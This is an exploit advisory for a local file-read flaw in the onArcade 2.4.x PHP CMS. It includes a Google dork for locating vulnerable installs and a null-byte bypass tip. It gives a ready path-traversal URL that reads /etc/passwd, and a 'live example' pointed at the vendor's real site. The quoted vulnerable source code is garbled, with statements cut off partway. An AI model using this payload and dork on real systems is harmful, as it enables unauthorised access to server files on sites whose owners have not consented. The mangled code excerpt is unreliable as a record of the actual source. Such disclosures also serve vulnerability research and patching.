# Google Dork: inurl:"cup.php?a=all"
# Date: 23 Mar 2017
# Exploit Author: Deyaa Muhammad
# Author Mail: contact [at] deyaa.me
# Exploit Blog:
http://www.deyaa.me/2017/03/onArcade-2.4.x-Local-File-Get-Contents-Vulnerability.html
# POC Video : https://youtu.be/IoQ0Z1OdZF0
# Vendor Homepage: http://www.onarcade.com/
# Demo Link: http://www.onarcade.com/Main/Demo
# Version: 2.4.x
# Tested on: 4.9.8-1-ARCH

[1] Introduction

Hello World,
onArcade is a nice PHP CMS Software that handle videos and online games
content,
As you can see [3] there is no enough filtering for template file handling,
which leads to file_get_contents() vulnerability.

[2] Vulnerable Versions

onArcade 2.4.2
onArcade 2.4.1
onArcade 2.4.0

[3] Bug Track

Because of the special treatment for .php extension, we wont be able to
read the files with php extension
But , you may use Null-Byte %00 to bypass this problem and "drop" the
extension in file path when PHP <= 5.3.4

File Link :
https://gist.github.com/deyaamuhammad/a77021cbed2285e12c59f3c0eed45af5#file-templates-php-L57
File Path : /srv/http/onarcade242/admin/templates.php
Line    : 57
[code]
    case &#039;template_values&#039;:
        $file_name = &#039;./templates/&#039;. $_GET[&#039;template&#039;] .&#039;/&#039;. $_GET[&#039;file&#039;];
        $file_type = strtolower(substr($_GET[&#039;file&#039;], -3));
        if ($file_type == &#039;.js&#039;) {
            $file_type = &#039;js&#039;;
        }

        if (!file_exists($file_name) || !($contents =
@file_get_contents($file_name))) {
            $template->json_error($lang[&#039;no_page_found&#039;]);
        }

        // array returned to user
        $return = array(&#039;error&#039;    =>    false,
            &#039;type&#039;    =>    $file_type,
            &#039;code&#039;    =>    &#039;&#039;
        );

        // process PHP template file
        if ($file_type == "php") {
            if (!isset($_GET[&#039;function&#039;])) {
                // get all templates list
                $return[&#039;functions&#039;] = array();
$contents, $matches);
                foreach ($matches[1] AS $match) {
                    $return[&#039;functions&#039;][] = $match;
                }
                unset($matches);

                if (!empty($return[&#039;functions&#039;])) {
                    $function = trim($return[&#039;functions&#039;][0]);
                }
            } else {
                $function = trim($_GET[&#039;function&#039;]);
            }

&#039;$&#039;), array(&#039;\\(&#039;, &#039;\\)&#039;, &#039;\\$&#039;), $function)
."\\s*}\n?(.+?)\n?{/template}#s", $contents, $match) > 0) {
                $return[&#039;code&#039;] = $match[1];
            } else {
                $template->json_error(&#039;Template not found.&#039;);
            }
        } else {
            $return[&#039;code&#039;] = $contents;
        }

        $template->json($return);
        break;
[/code]

[4] Conclusion

be safe don&#039;t upload this to your server.

[5] Exploit
http://www.target.com/onarcade242/admin/templates.php?a=template_values&file=../../../../../etc/passwd

[6] Live Example
http://www.onarcade.com/onarcade242/admin/templates.php?a=template_values&file=../../../../../etc/passwd

